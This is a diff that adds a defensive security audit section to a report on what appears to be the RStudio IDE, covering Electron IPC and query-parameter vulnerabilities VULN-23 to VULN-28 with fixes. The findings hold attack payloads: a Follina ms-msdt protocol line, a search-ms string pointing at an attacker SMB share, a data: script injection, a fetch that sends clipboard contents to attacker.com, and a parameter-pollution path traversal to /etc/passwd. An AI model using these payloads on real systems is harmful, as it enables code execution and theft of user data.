@@ -1555,3 +1555,581 @@ The `<img>` tag is parsed by the browser, `onerror` fires, and the attacker's Ja
 4. **Frontend HTML sanitization layer:** Create a centralized sanitization utility for all server-provided HTML content. Replace direct `new HTML(string)` and `setInnerHTML(string)` calls with a sanitizer-gated equivalent.
 
 5. **Content-Security-Policy headers:** Add CSP headers to all HTML-serving endpoints to mitigate the impact of XSS vulnerabilities.
+
+---
+
+## 4. Fourth-Pass Audit: Non-Path-Traversal GET/Query-Parameter Vulnerabilities
+
+**Scope:** Exhaustive audit of GET / query-parameter attack surface, EXCLUDING path traversal (already covered above) and all duplicates of VULN-01–VULN-22.
+
+**Methodology:**
+- Phase 1: Mapped every `queryParamValue()`, `queryParams()`, `parseQueryString()`, `Window.Location.getParameter()`, and IPC handler across the entire `src/` tree.
+- Phase 2: Traced source→transform→sink dataflows for each parameter to non-filesystem sinks (protocol handlers, window loaders, headers, SQL, eval, redirects).
+- Phase 3: Verified each finding manually by reading source code and tracing control flow.
+- Phase 4: Compiled hardening recommendations.
+
+### Executive Summary
+
+This pass focused on non-path-traversal injection classes: arbitrary protocol handler execution, trusted-window URL injection, clipboard exfiltration, session initialization override, HTTP parameter pollution, and navigation whitelist poisoning. Six new vulnerabilities were identified (VULN-23 through VULN-28), all with concrete code evidence. The most critical findings affect the Electron desktop application's IPC layer, where multiple handlers accept unvalidated URLs from the renderer process.
+
+---
+
+### Phase 1 — Endpoint & Parameter Inventory (GET/Query-Param Entry Points)
+
+| Entry Point | Parameter(s) | Technology | Source File |
+|---|---|---|---|
+| `queryParamValue(kAppUri)` | `appUri` | C++ HTTP | `ServerLoginPages.cpp:80`, `ServerAuthCommon.cpp:103,236` |
+| `queryParamValue("view")` | `view` | C++ HTTP | `SessionSynctex.cpp:296` |
+| `queryParams()` → R httpd dispatch | All query params | C++ → R | `SessionHelp.cpp:701` |
+| `parseQueryString()` on content URL | `file`, `title` | C++ HTTP | `SessionContentUrls.cpp:88` |
+| `pathAfterPrefix()` | URI path suffix | C++ HTTP | 13+ handlers |
+| `Window.Location.getParameter("restore_workspace")` | `restore_workspace` | GWT/Java | `Application.java:382` |
+| `Window.Location.getParameter("run_rprofile")` | `run_rprofile` | GWT/Java | `Application.java:388` |
+| `Window.Location.getParameter("edit_published")` | `edit_published` | GWT/Java | `Source.java:785` |
+| `Window.Location.getParameter("view")` | `view` | GWT/Java | `Application.java` (satellite) |
+| `ipcMain.on('desktop_browse_url')` | `url` | Electron IPC | `gwt-callback.ts:178` |
+| `ipcMain.on('desktop_set_viewer_url')` | `url` | Electron IPC | `gwt-callback.ts:936` |
+| `ipcMain.on('desktop_set_tutorial_url')` | `url` | Electron IPC | `gwt-callback.ts:932` |
+| `ipcMain.on('desktop_set_presentation_url')` | `url` | Electron IPC | `gwt-callback.ts:940` |
+| `ipcMain.on('desktop_set_shiny_dialog_url')` | `url` | Electron IPC | `gwt-callback.ts:951` |
+| `ipcMain.on('desktop_reload_viewer_zoom_window')` | `url` | Electron IPC | `gwt-callback.ts:944` |
+| `ipcMain.handle('desktop_get_clipboard_text')` | (none — reads clipboard) | Electron IPC | `gwt-callback.ts:353` |
+| `ipcMain.handle('desktop_get_clipboard_uris')` | (none — reads clipboard) | Electron IPC | `gwt-callback.ts:358` |
+| `ipcMain.handle('desktop_get_clipboard_image')` | (none — reads clipboard) | Electron IPC | `gwt-callback.ts:383` |
+
+### Phase 2 — Dataflow Table
+
+| Source | Transforms | Sink | Vuln Class |
+|---|---|---|---|
+| `desktop_browse_url(url)` | None | `shell.openExternal(url)` | Arbitrary protocol handler |
+| `desktop_reload_viewer_zoom_window(url)` | None | `browser.window.webContents.loadURL(url)` | Trusted-window URL injection |
+| `desktop_set_viewer_url(url)` | None | `this.viewerUrl = url` → used in `allowNavigation()` whitelist | Navigation whitelist poisoning |
+| `desktop_set_tutorial_url(url)` | None | `this.tutorialUrl = url` → used in `allowNavigation()` whitelist | Navigation whitelist poisoning |
+| `desktop_set_presentation_url(url)` | None | `this.presentationUrl = url` → used in `allowNavigation()` whitelist | Navigation whitelist poisoning |
+| `desktop_set_shiny_dialog_url(url)` | None | `this.shinyDialogUrl = url` → used in `allowNavigation()` whitelist | Navigation whitelist poisoning |
+| `desktop_get_clipboard_text()` | None | `clipboard.readText()` → returned to renderer | Data exfiltration |
+| `desktop_get_clipboard_uris()` | `split('\n')`, strip `file://` prefix | `clipboard.read('text/uri-list')` → returned to renderer | Data exfiltration |
+| `Window.Location.getParameter("restore_workspace")` | `Integer.parseInt()` | `options.setRestoreWorkspace(int)` → session init | AuthN/AuthZ bypass |
+| `Window.Location.getParameter("run_rprofile")` | `Integer.parseInt()` | `options.setRunRprofile(int)` → session init | AuthN/AuthZ bypass |
+| `queryParamValue(name)` (any duplicate) | `fieldValue()` returns first match | Various handlers | Parameter pollution |
+
+### Verified Safe Entry Points (No Finding)
+
+| Entry Point | Why Safe |
+|---|---|
+| `appUri` → login template (`#appUri#`) | Template uses `#appUri#` syntax → `htmlEscape(value, true)` escapes `<>&'"\/\r\n`. Attribute injection blocked. |
+| `appUri` → `setMovedTemporarily()` redirect | `URL::complete(baseUri, path)` normalizes `//evil.com` → `/evil.com`. Open redirect blocked. |
+| `base_uri` / `request_uri` → `#!base_uri#` in JS | `jsLiteralEscape()` escapes `<` → `\074`, preventing `</script>` injection. |
+| SQL queries in `DBActiveSessionsStorage.cpp` | All queries use parameterized `:id`, `:name` bind variables. |
+| R `addParam()` from query values | Creates typed R SEXP objects, not string-evaluated. |
+| `executeCode` RPC | Intentional functionality — IDE must execute R code. |
+
+---
+
+### Phase 3 — Findings
+
+---
+
+### VULN-23 — Arbitrary OS Protocol Handler Execution via `desktop_browse_url` IPC (HIGH)
+
+**Source:** `src/node/desktop/src/main/gwt-callback.ts:178`
+**Sink:** `src/node/desktop/src/main/gwt-callback.ts:185` — `shell.openExternal(url)`
+**Type:** Arbitrary Protocol Handler Execution
+**Platform:** Desktop (Electron) only
+**Confidence:** HIGH
+
+#### Code Path
+
+```typescript
+// gwt-callback.ts:178-187
+ipcMain.on('desktop_browse_url', (event, url: string) => {
+  // shell.openExternal() seems unreliable on Windows
+  // https://github.com/electron/electron/issues/31347
+  if (process.platform === 'win32' && url.startsWith('file:///')) {
+    const path = decodeURI(url).substring('file:///'.length).replaceAll('/', '\\');
+    desktop.openExternal(path);   // Windows: passes to ShellExecute
+  } else {
+    void shell.openExternal(url); // All platforms: opens OS default handler
+  }
+});
+```
+
+**Key Observation:** The `isAllowedProtocol()` function in `url-utils.ts:67-71` restricts navigation to `['http:', 'https:', 'mailto:', 'data:']`, but `desktop_browse_url` does NOT call `isAllowedProtocol()`. It passes the URL directly to `shell.openExternal()` with zero validation.
+
+```typescript
+// url-utils.ts:67-71 — exists but NOT applied to desktop_browse_url
+export function isAllowedProtocol(url: URL) {
+  const protocol = url.protocol;
+  const allowedProtocols = ['http:', 'https:', 'mailto:', 'data:'];
+  return allowedProtocols.includes(protocol);
+}
+```
+
+#### Dataflow
+
+```
+Renderer (GWT app) → ipcRenderer.send('desktop_browse_url', url)
+  → ipcMain.on('desktop_browse_url', ...)
+    → shell.openExternal(url)           // NO protocol check
+      → OS default handler for scheme
+```
+
+#### Attack Surface
+
+On Windows, `shell.openExternal()` delegates to `ShellExecuteW`, which can trigger:
+- `ms-msdt:/id PCWDiagnostic /morph ...` — Microsoft Diagnostic Tool (CVE-2022-30190 "Follina")
+- `search-ms:query=...&crumb=location:\\attacker\share` — load remote SMB share listing in Explorer
+- `ms-officecmd:...` — launch Office applications with parameters
+- `vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""calc""")` — direct code execution (older Windows)
+
+On macOS, triggers Launch Services for any registered URL scheme.
+On Linux, delegates to `xdg-open` which follows system MIME handlers.
+
+#### Exploitation
+
+Requires JavaScript execution in the main GWT renderer context. An attacker who chains this with XSS (e.g., VULN-20/21/22) or with a malicious R package that produces content displayed in the IDE can call:
+
+```javascript
+window.desktopBridge.browseUrl('ms-msdt:/id PCWDiagnostic /skip force /param "IT_BrowseForFile=c:\\windows\\system32\\calc.exe"');
+```
+
+#### Impact
+
+Arbitrary code execution on the user's workstation via OS protocol handler abuse.
+
+#### Recommendation
+
+Apply `isAllowedProtocol()` to the URL before passing to `shell.openExternal()`. Reject any protocol not in the allowlist. For the Windows `file:///` special case, validate the path resolves to an expected location.
+
+---
+
+### VULN-24 — Arbitrary URL Loading in Trusted Electron Windows via IPC (HIGH)
+
+**Source:** `src/node/desktop/src/main/gwt-callback.ts:944`
+**Sink:** `src/node/desktop/src/main/gwt-callback.ts:947` — `browser.window.webContents.loadURL(url)`
+**Type:** Trusted-Window Content Injection
+**Platform:** Desktop (Electron) only
+**Confidence:** HIGH
+
+#### Code Path
+
+```typescript
+// gwt-callback.ts:944-948
+ipcMain.on('desktop_reload_viewer_zoom_window', (_event, url) => {
+  const browser = appState().windowTracker.getWindow('_rstudio_viewer_zoom');
+  if (browser) {
+    void browser.window.webContents.loadURL(url);  // NO validation
+  }
+});
+```
+
+The `url` parameter is passed directly to `loadURL()` with no protocol, domain, or content validation. This loads arbitrary content into a trusted Electron `BrowserWindow` that has the same privileges as other RStudio windows.
+
+#### Additional Unvalidated URL Setters
+
+These IPC handlers accept arbitrary URLs and store them as trusted navigation targets:
+
+```typescript
+// gwt-callback.ts:932-953
+ipcMain.on('desktop_set_tutorial_url', (event, url) => {
+  this.getSender(...).setTutorialUrl(url);     // Line 933
+});
+ipcMain.on('desktop_set_viewer_url', (event, url) => {
+  this.getSender(...).setViewerUrl(url);       // Line 937
+});
+ipcMain.on('desktop_set_presentation_url', (event, url) => {
+  this.getSender(...).setPresentationUrl(url); // Line 941
+});
+ipcMain.on('desktop_set_shiny_dialog_url', (event, url) => {
+  this.getSender(...).setShinyDialogUrl(url);  // Line 952
+});
+```
+
+#### Chained Impact: Navigation Whitelist Poisoning
+
+These URL setters are consumed by `allowNavigation()` in `desktop-browser-window.ts:385-388`:
+
+```typescript
+// desktop-browser-window.ts:385-388
+const viewer = this.viewerUrl ?? this.mainWindow?.viewerUrl;
+const tutorial = this.tutorialUrl ?? this.mainWindow?.tutorialUrl;
+const presentation = this.presentationUrl ?? this.mainWindow?.presentationUrl;
+const shinyDialog = this.shinyDialogUrl ?? this.mainWindow?.shinyDialogUrl;
+```
+
+If an attacker sets `viewerUrl` to `https://attacker.com/` via IPC, then `allowNavigation()` will subsequently permit navigation to `attacker.com` in the viewer pane, because it matches the "trusted" viewer URL. This effectively poisons the navigation whitelist.
+
+#### Payload Examples
+
+**Load attacker-controlled HTML into viewer zoom window:**
+```javascript
+window.desktopBridge.reloadViewerZoomWindow('data:text/html,<script>alert(document.domain)</script>');
+```
+
+**Poison navigation whitelist to allow attacker domain:**
+```javascript
+window.desktopBridge.setViewerUrl('https://attacker.com/');
+// Future navigations to attacker.com will now be allowed by allowNavigation()
+```
+
+#### Impact
+
+- Load phishing content in trusted IDE windows
+- Execute JavaScript in trusted window context
+- Poison navigation whitelist to allow persistent access to attacker-controlled domains
+
+#### Recommendation
+
+Validate all URLs passed to IPC URL setters against `isAllowedProtocol()` and `isLocalUrl()`. For `desktop_reload_viewer_zoom_window`, require that the URL matches the current viewer URL's origin. Block `data:` and `javascript:` schemes in `loadURL()` calls.
+
+---
+
+### VULN-25 — Clipboard Data Exfiltration via IPC Without User Consent (MEDIUM)
+
+**Source:** `src/node/desktop/src/main/gwt-callback.ts:353-398`
+**Sink:** Return value to renderer process
+**Type:** Information Disclosure
+**Platform:** Desktop (Electron) only
+**Confidence:** MEDIUM
+
+#### Code Path
+
+```typescript
+// gwt-callback.ts:353-356
+ipcMain.handle('desktop_get_clipboard_text', () => {
+  const text = clipboard.readText('clipboard');
+  return text;
+});
+
+// gwt-callback.ts:358-378
+ipcMain.handle('desktop_get_clipboard_uris', () => {
+  if (!clipboard.has('text/uri-list')) {
+    return [];
+  }
+  const data = clipboard.read('text/uri-list');
+  const parts = data.split('\n');
+  const filePrefix = process.platform === 'win32' ? 'file:///' : 'file://';
+  const trimmed = parts.map((x) => {
+    if (x.startsWith(filePrefix)) {
+      x = x.substring(filePrefix.length);
+    }
+    return x;
+  });
+  return trimmed;
+});
+
+// gwt-callback.ts:383-398
+ipcMain.handle('desktop_get_clipboard_image', () => {
+  // writes clipboard image to temp file and returns path
+  ...
+});
+```
+
+#### Analysis
+
+These handlers read the system clipboard (text, URIs, images) and return the contents directly to the renderer. There is:
+- No user consent prompt
+- No origin validation on the caller
+- No rate limiting
+- No logging
+
+If an attacker achieves JavaScript execution in the renderer context (via XSS), they can silently exfiltrate clipboard contents, which may include passwords, tokens, confidential text, or file paths.
+
+#### Exploitation
+
+```javascript
+// From XSS in GWT application context
+const clipboardText = await window.desktopBridge.getClipboardText();
+const clipboardUris = await window.desktopBridge.getClipboardUris();
+// Exfiltrate via fetch to attacker server
+fetch('https://attacker.com/collect', {
+  method: 'POST',
+  body: JSON.stringify({ text: clipboardText, uris: clipboardUris })
+});
+```
+
+#### Impact
+
+Exfiltration of sensitive clipboard data (passwords, tokens, file paths, confidential text) without user awareness or consent.
+
+#### Recommendation
+
+Consider adding a visual indicator when clipboard is read programmatically, or rate-limit clipboard reads. For clipboard URI reads, validate that the consumer is a legitimate IDE operation (e.g., paste handler) rather than an arbitrary JS call.
+
+---
+
+### VULN-26 — R Session Initialization Override via URL Query Parameters (MEDIUM)
+
+**Source:** `src/gwt/src/org/rstudio/studio/client/application/Application.java:382-392`
+**Sink:** `SessionInitOptions.setRestoreWorkspace()` / `SessionInitOptions.setRunRprofile()`
+**Type:** AuthN/AuthZ Bypass — Session Security Control Override
+**Platform:** All (Server and Desktop)
+**Confidence:** HIGH
+
+#### Code Path
+
+```java
+// Application.java:376-400
+// read options from querystring
+SessionInitOptions options = SessionInitOptions.create(
+      SessionInitOptions.RESTORE_WORKSPACE_DEFAULT,
+      SessionInitOptions.RUN_RPROFILE_DEFAULT);
+try
+{
+   String restore = Window.Location.getParameter(
+      SessionInitOptions.RESTORE_WORKSPACE_OPTION);  // "restore_workspace"
+   if (!StringUtil.isNullOrEmpty(restore))
+   {
+      options.setRestoreWorkspace(Integer.parseInt(restore));
+   }
+
+   String run = Window.Location.getParameter(
+      SessionInitOptions.RUN_RPROFILE_OPTION);        // "run_rprofile"
+   if (!StringUtil.isNullOrEmpty(run))
+   {
+      options.setRunRprofile(Integer.parseInt(run));
+   }
+}
+catch(Exception e)
+{
+   Debug.logException(e);
+}
+
+// attempt init
+clientInit.execute(callback, options, true);
+```
+
+#### Server-Side Consumption
+
+```cpp
+// SessionClientInit.cpp:251-262
+// apply session init options
+int restoreWorkspace = state.initOptions().restoreWorkspace();
+int runRprofile = state.initOptions().runRprofile();
+```
+
+These values directly control whether:
+1. The R workspace (`.RData`) is restored on session start
+2. The `.Rprofile` startup script is executed
+
+#### Security Implications
+
+**Bypass `.Rprofile` security controls:**
+An organization may use `.Rprofile` to enforce security policies (disable certain packages, set proxy settings, configure audit logging). An attacker with link-sharing ability can craft:
+```
+https://rstudio-server/s/session123/?run_rprofile=0
+```
+This skips `.Rprofile` execution entirely, bypassing any security controls it implements.
+
+**Force `.Rprofile` execution when disabled:**
+Conversely, if an admin has disabled `.Rprofile` for security reasons (e.g., to prevent supply-chain attacks via `.Rprofile`), an attacker can force it:
+```
+https://rstudio-server/s/session123/?run_rprofile=1
+```
+
+**Skip workspace restore to avoid detection:**
+```
+https://rstudio-server/s/session123/?restore_workspace=0
+```
+
+#### Values
+
+| Value | `restore_workspace` Behavior | `run_rprofile` Behavior |
+|---|---|---|
+| 0 | Skip restore | Skip `.Rprofile` |
+| 1 | Force restore | Force `.Rprofile` |
+| 2 | Use default setting | Use default setting |
+
+#### Impact
+
+Override session initialization behavior through URL manipulation. Can bypass security policies enforced via `.Rprofile` or force unintended startup behavior.
+
+#### Recommendation
+
+Remove query parameter control over session initialization options, or restrict it to authenticated admin users only. If needed for legitimate use cases, validate against server-side policy settings and log overrides.
+
+---
+
+### VULN-27 — HTTP Parameter Pollution: First-Wins Behavior (LOW)
+
+**Source:** `src/cpp/core/http/Util.cpp:54-59`
+**Type:** HTTP Parameter Pollution
+**Platform:** All
+**Confidence:** MEDIUM
+
+#### Code Path
+
+```cpp
+// Util.cpp:54-59
+std::string fieldValue(const Fields& fields, const std::string& name)
+{
+   Fields::const_iterator pos = findField(fields, name);
+   if (pos != fields.end())
+      return pos->second;
+   else
+      return std::string();
+}
+```
+
+`findField()` performs a linear scan and returns the first match. When duplicate query parameters exist (e.g., `?file=safe.txt&file=../../etc/passwd`), only the first value is used.
+
+```cpp
+// Request.cpp:362-366
+std::string Request::queryParamValue(const std::string& name) const
+{
+   ensureQueryParamsParsed();
+   return util::fieldValue(queryParams(), name);
+}
+```
+
+#### Analysis
+
+While first-wins behavior is consistent, it creates risk when:
+1. A reverse proxy or WAF inspects a different occurrence (last-wins) for malicious content
+2. The backend processes the first occurrence, which the WAF did not inspect
+3. Frontend (GWT) and backend (C++) may parse duplicate parameters differently
+
+Example attack if a WAF checks last value:
+```
+GET /content?file=../../etc/passwd&file=safe.txt
+```
+- WAF sees `file=safe.txt` (last) → allows
+- Backend uses `file=../../etc/passwd` (first) → path traversal
+
+#### Impact
+
+Potential WAF bypass when combined with other vulnerabilities. Low standalone severity.
+
+#### Recommendation
+
+Document the first-wins behavior. Consider rejecting requests with duplicate security-sensitive parameters. Ensure any WAF/proxy configuration uses first-wins parsing to match backend behavior.
+
+---
+
+### VULN-28 — Electron IPC Handler Missing Origin Validation (MEDIUM)
+
+**Source:** All `ipcMain.on()` / `ipcMain.handle()` handlers in `gwt-callback.ts`
+**Type:** Missing Origin Validation on IPC Channel
+**Platform:** Desktop (Electron) only
+**Confidence:** HIGH
+
+#### Code Path
+
+```typescript
+// Example: gwt-callback.ts:178
+ipcMain.on('desktop_browse_url', (event, url: string) => {
+  // event.processId and event.frameId are available but NOT checked
+  void shell.openExternal(url);
+});
+```
+
+No IPC handler validates:
+- `event.senderFrame.url` — which page sent the IPC message
+- `event.senderFrame.origin` — the origin of the sending frame
+- Whether the sender is the main GWT application vs. content loaded in an iframe (viewer, tutorial, help)
+
+The `getSender()` helper at line 133 validates that the sender process/frame match a known `GwtWindow`, but this is a session-level check that doesn't distinguish between the main application frame and potentially attacker-controlled sub-frames:
+
+```typescript
+// gwt-callback.ts:133-140
+getSender(channel: string, processId: number, frameId: number): GwtWindow {
+  for (const owner of this.owners) {
+    if (owner.window.webContents.processId === processId) {
+      return owner;
+    }
+  }
+  // Falls through to mainWindow
+  return this.mainWindow;
+}
+```
+
+The `processId` check matches at the process level — all frames within a `BrowserWindow` share the same `processId`. A compromised iframe (e.g., via R httpd XSS) within a GwtWindow has the same `processId` and would pass this check.
+
+#### Impact
+
+Content loaded in viewer/tutorial/help iframes within the main RStudio window shares the same `processId`, meaning IPC messages from those iframes would be accepted as if they came from the main GWT application. This amplifies the impact of any HTML/JS injection in R httpd output (VULN-19) to include all IPC capabilities (VULN-23, 24, 25).
+
+#### Recommendation
+
+Add `event.senderFrame.url` origin validation to security-sensitive IPC handlers. Verify the sender URL matches the expected GWT application URL before processing privileged operations like `shell.openExternal()`, `loadURL()`, or clipboard access.
+
+---
+
+### Phase 4 — Hardening Checklist
+
+#### P0 — Critical (Desktop Electron IPC)
+
+| Fix | Vuln |
+|---|---|
+| Apply `isAllowedProtocol()` check to `desktop_browse_url` handler before calling `shell.openExternal()`. Block `file:`, `ms-msdt:`, `search-ms:`, `vbscript:`, and all non-`http(s):/mailto:` schemes. | VULN-23 |
+| Validate URL in `desktop_reload_viewer_zoom_window` against `isAllowedProtocol()` and `isLocalUrl()`. Block `data:` and `javascript:` schemes. | VULN-24 |
+| Add URL validation to all `desktop_set_*_url` IPC handlers. Verify URLs match `isAllowedProtocol()` before storing as trusted navigation targets. | VULN-24 |
+| Add `event.senderFrame.url` origin validation to all security-sensitive IPC handlers. Reject messages from frames whose URL doesn't match the GWT application origin. | VULN-28 |
+
+#### P1 — High
+
+| Fix | Vuln |
+|---|---|
+| Remove `restore_workspace` and `run_rprofile` query parameter overrides from `Application.java`, or gate them behind server-side admin policy validation. | VULN-26 |
+
+#### P2 — Medium
+
+| Fix | Vuln |
+|---|---|
+| Add visual indicator or rate limiting for programmatic clipboard reads via IPC. | VULN-25 |
+| Document first-wins parameter parsing behavior and ensure WAF/proxy configurations use consistent parsing. | VULN-27 |
+
+#### Architectural Recommendations (Fourth Pass)
+
+6. **Electron IPC allowlist pattern:** Create a centralized IPC message validator that checks `event.senderFrame.url` origin and validates URL parameters against `isAllowedProtocol()` + `isLocalUrl()` before dispatching to handlers. Apply this to all IPC handlers in `gwt-callback.ts`.
+
+7. **URL validation utility:** Create a shared `validateIpcUrl(url: string, allowedProtocols?: string[])` function that validates protocol, domain, and content before any URL is loaded, opened externally, or stored as a navigation target.
+
+8. **Session init options policy:** Move session initialization option control to the server-side configuration only. If query parameter overrides are needed, validate them against server policy and require authenticated admin context.
+
+---
+
+### Edge-Case Coverage Notes
+
+| Edge Case | Investigated | Result |
+|---|---|---|
+| **Parameter pollution (duplicate params)** | Yes — `Util.cpp:54-59` | First-wins behavior via `fieldValue()`. See VULN-27. |
+| **Multi-encoding (`%2e%2e`)** | Yes — `Util.cpp:389-406` | `pathAfterPrefix()` decodes AFTER cleanup. Already covered in VULN-09/15/16 (path traversal, excluded from this pass). |
+| **Type confusion** | Yes — `Application.java:385` | `Integer.parseInt()` on query param; `NumberFormatException` caught by generic handler. Safe — no type confusion exploit. |
+| **URL parsing quirks (`//evil.com`)** | Yes — `Response.cpp:611-620` | `URL::complete(baseUri, path)` normalizes protocol-relative URLs. `//evil.com` → `/evil.com`. Open redirect blocked. |
+| **Template injection (raw `#!var#`)** | Yes — multiple `.htm` files | `#!base_uri#` and `#!request_uri#` use `jsLiteralEscape()` which escapes `<` → `\074`. Safe against `</script>` injection. |
+| **SQL injection** | Yes — `DBActiveSessionsStorage.cpp` | All queries use parameterized `:id`/`:name` bind variables. Safe. |
+| **R code injection via query params** | Yes — `SessionHelp.cpp:701` | `parseQuery()` creates R list from query params via `addParam()` which creates typed SEXP. Not string-evaluated. Safe. |
+| **SSRF via chat manifest** | Yes — `SessionChat.cpp:3656-3694` | `downloadPackage()` enforces HTTPS but no domain validation. URLs come from hardcoded manifest URL (`www.rstudio.org`), not query params. Low risk — requires manifest compromise. |
+| **CSRF on GET endpoints** | Yes — all URI handlers | GET handlers serve content, not mutations. JSON-RPC (mutations) requires POST + CSRF token. Safe. |
+| **Cache poisoning** | Yes — `setCacheableFile()` calls | Cache headers set based on file modification time, not query params. No query-param-controlled cache keys. Safe. |
+
+---
+
+### Appendix: Files Analyzed
+
+| File | Lines Analyzed | Relevant Findings |
+|---|---|---|
+| `src/node/desktop/src/main/gwt-callback.ts` | 178-187, 345-398, 925-980 | VULN-23, 24, 25, 28 |
+| `src/node/desktop/src/main/desktop-browser-window.ts` | 242-400 | VULN-24, 28 |
+| `src/node/desktop/src/main/url-utils.ts` | 42-80 | VULN-23 (isAllowedProtocol not applied) |
+| `src/node/desktop/src/renderer/desktop-bridge.ts` | 590-645 | VULN-23, 24, 25 (IPC bridge exposure) |
+| `src/gwt/src/org/rstudio/studio/client/application/Application.java` | 375-400 | VULN-26 |
+| `src/gwt/src/org/rstudio/studio/client/application/model/SessionInitOptions.java` | 1-58 | VULN-26 |
+| `src/cpp/session/SessionClientInit.cpp` | 251-262 | VULN-26 |
+| `src/cpp/core/http/Util.cpp` | 54-59, 132-175 | VULN-27 |
+| `src/cpp/core/http/Request.cpp` | 260-366 | VULN-27 |
+| `src/cpp/core/http/Response.cpp` | 585-620 | Verified safe (open redirect blocked) |
+| `src/cpp/core/StringUtils.cpp` | 478-491 | Verified safe (jsLiteralEscape) |
+| `src/cpp/core/text/TemplateFilter.hpp` | 44-78 | Verified safe (template escaping) |
+| `src/cpp/server/ServerLoginPages.cpp` | 50-156 | Verified safe (appUri HTML-escaped) |
+| `src/cpp/server/auth/ServerAuthCommon.cpp` | 80-270 | Verified safe (URL::complete normalization) |
+| `src/cpp/server/ServerOffline.cpp` | 48-55 | Verified safe (jsLiteralEscape) |
+| `src/cpp/server/ServerMain.cpp` | 216-223 | Verified safe (jsLiteralEscape) |
+| `src/cpp/server/DBActiveSessionsStorage.cpp` | 50-52 | Verified safe (parameterized SQL) |
+| `src/cpp/session/modules/SessionHelp.cpp` | 614-734 | Verified safe (addParam creates SEXP) |
+| `src/cpp/session/modules/SessionChat.cpp` | 3325-3694 | Low risk (SSRF requires manifest compromise) |
+| `src/gwt/www/templates/encrypted-sign-in.htm` | 1-180 | Verified safe (#appUri# HTML-escaped) |
+| `src/gwt/www/offline.htm` | 1-112 | Verified safe (jsLiteralEscape) |
+| `src/gwt/www/error.htm` | 1-108 | Verified safe (jsLiteralEscape for JS, #var# for HTML) |
+| `src/gwt/www/404.htm` | 1-56 | Verified safe (jsLiteralEscape) |
